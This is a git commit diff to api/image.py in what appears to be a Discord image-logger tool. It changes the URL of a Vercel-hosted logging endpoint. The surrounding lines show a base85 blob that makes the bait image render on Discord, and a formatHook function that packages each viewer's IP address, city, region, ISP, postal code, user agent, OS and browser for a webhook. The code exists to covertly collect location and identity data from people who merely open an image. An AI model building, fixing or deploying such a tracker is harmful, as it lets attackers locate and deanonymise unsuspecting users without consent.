558b7160bb4646c8ae7c3ab00a5f4e2cc160811a
ERIGAWOKH <Ashur_warda@hotmail.com>
2025-05-22 10:46:00 +0200

    Update image.py

--- api/image.py
+++ api/image.py
@@ -8,7 +8,7 @@ buggedimg = True # Set this to True if you want the image to load on discord, Fa
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
 
- URL = https://discord-image-logger-one-cyan.vercel.app/API/IMAGE
+ URL = https://discord-image-logger-one-cyan.vercel.app/api/image.py
 
 def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
     return {
